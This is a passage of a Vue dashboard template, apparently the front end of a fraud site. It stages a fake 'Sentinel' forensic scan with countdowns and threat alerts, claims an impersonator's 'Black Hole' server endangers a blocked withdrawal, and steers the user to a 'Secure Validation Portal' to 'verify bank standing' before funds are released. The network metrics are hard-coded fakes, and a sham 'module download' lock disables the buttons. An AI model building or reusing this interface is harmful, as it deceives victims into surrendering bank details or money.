                                <h3 class="text-2xl font-semibold text-white">{{ t('dashboard.scanTitle', 'Sentinel Scan') }}</h3>
                                <p class="mt-2 text-sm text-gray-400">{{ t('dashboard.scanSubtitle', 'Sentinel is forensically tracing the failed withdrawal route and isolating hostile relay behavior.') }}</p>
                            </div>
                            <button @click="closeSentinelScanModal" class="text-gray-400 hover:text-white">✕</button>
                        </div>

                        <div class="rounded-2xl border border-cyan-500/20 bg-slate-900/70 p-5">
                            <div class="flex items-center justify-between gap-4 mb-4">
                                <div>
                                    <div class="text-xs uppercase tracking-[0.25em] text-cyan-400">{{ t('dashboard.forensicLiveFeed', 'Forensic Live Feed') }}</div>
                                    <div class="mt-2 text-sm text-slate-300">{{ t('dashboard.forensicHelp', 'Withdrawal relay diagnostics with threat graph reconstruction.') }}</div>
                                </div>
                                <div class="text-right">
                                    <div class="text-xs uppercase tracking-[0.2em] text-slate-400">{{ t('dashboard.timeRemaining', 'Time Remaining') }}</div>
                                    <div class="mt-2 text-2xl font-mono text-cyan-300">{{ formatCountdown(sentinelScanTimeLeft * 1000) }}</div>
                                </div>
                            </div>

                            <div class="h-3 overflow-hidden rounded-full bg-slate-800 ring-1 ring-cyan-500/20">
                                <div class="h-full rounded-full bg-gradient-to-r from-cyan-500 via-sky-400 to-emerald-400 transition-all duration-1000" :style="{ width: `${sentinelScanProgress}%` }"></div>
                            </div>

                            <div class="mt-5 rounded-2xl border border-cyan-500/20 bg-cyan-950/20 p-4 text-sm text-slate-200">
                                {{ t('dashboard.detectionIntro', 'Sentinel is correlating routing anomalies, liquidity mismatches, settlement echoes, and hostile mirror signatures across the withdrawal path.') }}
                            </div>

                            <div class="mt-4 rounded-2xl border border-slate-700 bg-slate-950/80 p-4 text-sm text-slate-300">
                                {{ t('dashboard.detectionStack', 'Detection stack:') }}
                                <div class="mt-2 text-cyan-300">{{ t('dashboard.mirrorRouteEntropy', 'Mirror route entropy analysis') }}</div>
                                <div class="mt-2 text-cyan-300">{{ t('dashboard.blackHoleDetection', 'Black Hole siphon beacon detection') }}</div>
                                <div class="mt-2 text-cyan-300">{{ t('dashboard.checksumReconciliation', 'Bank standing checksum reconciliation') }}</div>
                                <div class="mt-2 text-cyan-300">{{ t('dashboard.relaySpoofConfirmation', 'Relay spoof confirmation') }}</div>
                            </div>

                            <div class="mt-5 max-h-80 overflow-y-auto rounded-2xl border border-cyan-500/20 bg-black/60 p-4 font-mono text-xs text-cyan-200">
                                <div v-for="(line, index) in sentinelScanLogs" :key="`sentinel-log-${index}`" class="mb-3 last:mb-0">
                                    {{ line }}
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div v-if="showSentinelThreatModal && sentinelScanThreatDetected" @click.self="closeSentinelThreatModal" class="fixed inset-0 z-[9998] flex items-center justify-center bg-black/80 px-4 py-6">
                    <div class="w-full max-w-2xl rounded-3xl border border-red-500/30 bg-gray-950/95 p-8 shadow-2xl shadow-red-500/10 backdrop-blur-md">
                        <div class="flex items-start justify-between gap-4 mb-6">
                            <div>
                                <h3 class="text-2xl font-semibold text-white">{{ t('dashboard.threatAnalysis', 'Threat Analysis') }}</h3>
                                <p class="mt-2 text-sm text-gray-400">{{ t('dashboard.threatModalSubtitle', 'The forensic scan has completed. Sentinel isolated the threat signature below.') }}</p>
                            </div>
                            <button @click="closeSentinelThreatModal" class="text-gray-400 hover:text-white">✕</button>
                        </div>

                        <div class="space-y-4">
                            <div class="rounded-2xl border border-red-500/30 bg-red-950/40 p-4">
                                <div class="text-sm font-semibold uppercase tracking-[0.2em] text-red-300">{{ sentinelScanThreatTitle }}</div>
                                <p class="mt-3 text-sm text-red-100">{{ sentinelScanThreatMessage }}</p>
                            </div>
                            <div class="rounded-2xl border border-amber-500/20 bg-amber-950/20 p-4 text-sm text-amber-100">
                                {{ t('dashboard.threatRecommendation', 'Sentinel recommends a Secure Validation Portal handshake before another release attempt is permitted.') }}
                            </div>
                        </div>

                        <div class="mt-6 flex justify-end">
                            <button @click="openSentinelPortalFromScan" class="inline-flex rounded-full bg-cyan-600 px-5 py-2 text-sm font-semibold text-white transition hover:bg-cyan-500">{{ t('dashboard.askSentinel', 'Ask Sentinel') }}</button>
                        </div>
                    </div>
                </div>

                <div v-if="showSentinelModal" @click.self="closeSentinelModal" class="fixed inset-0 z-[9999] flex items-center justify-center bg-black/75 px-4 py-6">
                    <div class="w-full max-w-3xl rounded-3xl border border-cyan-500/30 bg-gray-950/95 p-8 shadow-2xl shadow-cyan-500/20 backdrop-blur-md">
                        <div class="flex items-start justify-between gap-4 mb-6">
                            <div>
                                <h3 class="text-2xl font-semibold text-white">{{ t('dashboard.secureValidationPortal', 'Secure Validation Portal') }}</h3>
                                <p class="mt-2 text-sm text-gray-400">{{ t('dashboard.portalSubtitle', 'Sentinel will verify your bank standing and lift the withdrawal lock once values match.') }}</p>
                            </div>
                            <button @click="closeSentinelModal" class="text-gray-400 hover:text-white">✕</button>
                        </div>
                        <div class="space-y-4 text-sm text-gray-300">
                            <p>{{ t('dashboard.portalBodyOne', 'To unlock your funds, Sentinel must perform a Liquidity Verification Scan. This ensures that the bank balance on your end matches the secure records in our encrypted vault. If we attempt a transfer while the link is \'Unverified,\' the funds could be pulled into a \'Black Hole\' server created by the impersonator.') }}</p>
                            <p class="font-semibold text-cyan-300">{{ t('dashboard.portalResolution', 'Resolution:') }}</p>
                            <p>{{ t('dashboard.portalBodyTwo', 'Please proceed to the Secure Validation Portal. You will be asked to verify your current bank standing so I can \'White-list\' your banking node. Once the values match, the withdrawal lock will be lifted instantly.') }}</p>
                        </div>
                        <div class="mt-6 flex justify-end">
                            <button @click="continueFromSentinel" class="rounded-full bg-cyan-600 px-6 py-3 text-sm font-semibold text-white transition hover:bg-cyan-500">{{ t('common.continue', 'Continue') }}</button>
                        </div>
                    </div>
                </div>

                <div v-if="withdrawMessage" class="rounded-lg border border-green-500/30 bg-green-900/70 p-4 text-sm text-green-200 mb-6">
                    {{ withdrawMessage }}
                </div>

                <div v-if="withdrawError && !showTransferModal" class="rounded-lg border border-red-500/30 bg-red-950/80 p-4 text-sm text-red-200 mb-6">
                    {{ withdrawError }}
                </div>

                <!-- System Status Grid -->
                <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4 mb-6">
                    <div v-for="(status, key) in systemStatus" :key="key"
                         class="bg-gray-900/80 border border-cyan-500/30 rounded-lg p-4 backdrop-blur-sm">
                        <div class="flex items-center justify-between mb-2">
                            <span class="text-xs text-cyan-400 uppercase tracking-wider">{{ key }}</span>
                            <div class="w-2 h-2 bg-green-400 rounded-full animate-pulse"></div>
                        </div>
                        <div class="text-lg font-mono text-green-400">{{ status }}</div>
                    </div>
                </div>

                <!-- Metrics Row -->
                <div class="grid grid-cols-2 lg:grid-cols-4 gap-4 mb-6">
                    <div class="bg-gray-900/80 border border-cyan-500/30 rounded-lg p-4 backdrop-blur-sm">
                        <div class="text-xs text-cyan-400 uppercase tracking-wider mb-1">Threats Blocked</div>
                        <div class="text-2xl font-mono text-white">{{ metrics.threatsBlocked.toLocaleString() }}</div>
                    </div>
                    <div class="bg-gray-900/80 border border-cyan-500/30 rounded-lg p-4 backdrop-blur-sm">
                        <div class="text-xs text-cyan-400 uppercase tracking-wider mb-1">Active Sessions</div>
                        <div class="text-2xl font-mono text-white">{{ metrics.activeSessions }}</div>
                    </div>
                    <div class="bg-gray-900/80 border border-cyan-500/30 rounded-lg p-4 backdrop-blur-sm">
                        <div class="text-xs text-cyan-400 uppercase tracking-wider mb-1">System Uptime</div>
                        <div class="text-2xl font-mono text-green-400">{{ metrics.uptime }}</div>
                    </div>
                    <div class="bg-gray-900/80 border border-cyan-500/30 rounded-lg p-4 backdrop-blur-sm">
                        <div class="text-xs text-cyan-400 uppercase tracking-wider mb-1">Response Time</div>
                        <div class="text-2xl font-mono text-white">{{ metrics.responseTime }}</div>
                    </div>
                </div>

                <!-- Main Content Grid -->
                <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
                    <!-- Security Alerts -->
                    <div class="lg:col-span-2 bg-gray-900/80 border border-cyan-500/30 rounded-lg backdrop-blur-sm">
                        <div class="p-4 border-b border-cyan-500/20">
                            <h3 class="text-lg font-semibold text-white flex items-center">
                                <span class="w-2 h-2 bg-red-500 rounded-full mr-2 animate-pulse"></span>
                                {{ t('dashboard.securityAlerts', 'Security Alerts') }}
                            </h3>
                        </div>
                        <div class="p-4 max-h-96 overflow-y-auto">
                            <div v-for="alert in alerts" :key="alert.id"
                                 class="flex items-start space-x-3 p-3 rounded-lg mb-3"
                                 :class="{
                                     'bg-red-900/20 border border-red-500/30': alert.type === 'warning',
                                     'bg-blue-900/20 border border-blue-500/30': alert.type === 'info',
                                     'bg-green-900/20 border border-green-500/30': alert.type === 'success'
                                 }">
                                <div class="flex-shrink-0">
                                    <div :class="{
                                        'w-2 h-2 bg-red-500': alert.type === 'warning',
                                        'w-2 h-2 bg-blue-500': alert.type === 'info',
                                        'w-2 h-2 bg-green-500': alert.type === 'success'
                                    }"></div>
                                </div>
                                <div class="flex-1 min-w-0">
                                    <p class="text-sm text-white">{{ alert.message }}</p>
                                    <p class="text-xs text-gray-400 mt-1">{{ alert.time }}</p>
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- Quick Actions -->
                    <div class="relative overflow-hidden bg-gray-900/80 border border-cyan-500/30 rounded-lg backdrop-blur-sm">
                        <div class="p-4 border-b border-cyan-500/20">
                            <h3 class="text-lg font-semibold text-white">{{ t('dashboard.quickActions', 'Quick Actions') }}</h3>
                        </div>
                        <div class="p-4 space-y-3">
                            <button :disabled="areQuickActionsLocked" class="w-full bg-cyan-600 hover:bg-cyan-500 disabled:bg-cyan-800/60 disabled:text-cyan-100/70 text-white py-2 px-4 rounded text-sm font-medium transition-colors">
                                {{ t('dashboard.runSecurityScan', 'Run Security Scan') }}
                            </button>
                            <button :disabled="areQuickActionsLocked" class="w-full bg-gray-700 hover:bg-gray-600 disabled:bg-gray-800/80 disabled:text-gray-300/70 text-white py-2 px-4 rounded text-sm font-medium transition-colors">
                                {{ t('dashboard.viewLogs', 'View Logs') }}
                            </button>
                            <button :disabled="areQuickActionsLocked" class="w-full bg-gray-700 hover:bg-gray-600 disabled:bg-gray-800/80 disabled:text-gray-300/70 text-white py-2 px-4 rounded text-sm font-medium transition-colors">
                                {{ t('dashboard.systemSettings', 'System Settings') }}
                            </button>
                            <button :disabled="areQuickActionsLocked" class="w-full bg-red-600 hover:bg-red-500 disabled:bg-red-900/70 disabled:text-red-100/70 text-white py-2 px-4 rounded text-sm font-medium transition-colors">
                                {{ t('dashboard.emergencyLockdown', 'Emergency Lockdown') }}
                            </button>
                        </div>

                        <div v-if="areQuickActionsLocked" class="absolute inset-0 z-10 flex flex-col items-center justify-center bg-black/75 px-6 text-center backdrop-blur-sm">
                            <div class="mb-4 h-14 w-14 rounded-full border-4 border-cyan-500/40 border-t-cyan-300 animate-spin"></div>
                            <p class="text-sm font-semibold uppercase tracking-[0.25em] text-cyan-300">{{ t('dashboard.moduleDownloadProgress', 'Module download in progress') }}</p>
                            <p class="mt-3 max-w-xs text-sm text-slate-300">{{ t('dashboard.moduleDownloadHelp', 'Security command modules are being provisioned. These actions remain unavailable to users until the download window closes.') }}</p>
                            <p class="mt-3 text-xs uppercase tracking-[0.2em] text-slate-400">{{ t('dashboard.timeRemaining', 'Time remaining') }}: {{ actionLockCountdown }}</p>
                        </div>
                    </div>
                </div>

                <!-- Network Activity -->
                <div class="mt-6 bg-gray-900/80 border border-cyan-500/30 rounded-lg backdrop-blur-sm">
                    <div class="p-4 border-b border-cyan-500/20">
                        <h3 class="text-lg font-semibold text-white">{{ t('dashboard.networkActivity', 'Network Activity') }}</h3>
                    </div>
                    <div class="p-4">
                        <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
                            <div class="text-center">
                                <div class="text-3xl font-mono text-cyan-400 mb-1">2.4K</div>
                                <div class="text-xs text-gray-400 uppercase">{{ t('dashboard.packetsPerSec', 'Packets/sec') }}</div>
                            </div>
                            <div class="text-center">
                                <div class="text-3xl font-mono text-green-400 mb-1">98.2%</div>
                                <div class="text-xs text-gray-400 uppercase">{{ t('dashboard.successRate', 'Success Rate') }}</div>
                            </div>
                            <div class="text-center">
                                <div class="text-3xl font-mono text-yellow-400 mb-1">12</div>
                                <div class="text-xs text-gray-400 uppercase">{{ t('dashboard.activeConnections', 'Active Connections') }}</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </AuthenticatedLayout>
</template>

<style scoped>
/* Custom scrollbar for alerts */
.max-h-96::-webkit-scrollbar {
    width: 6px;
}

.max-h-96::-webkit-scrollbar-track {
    background: rgba(0, 0, 0, 0.1);
}

.max-h-96::-webkit-scrollbar-thumb {
    background: rgba(0, 186, 255, 0.3);
    border-radius: 3px;
}

.max-h-96::-webkit-scrollbar-thumb:hover {
    background: rgba(0, 186, 255, 0.5);
}
</style>
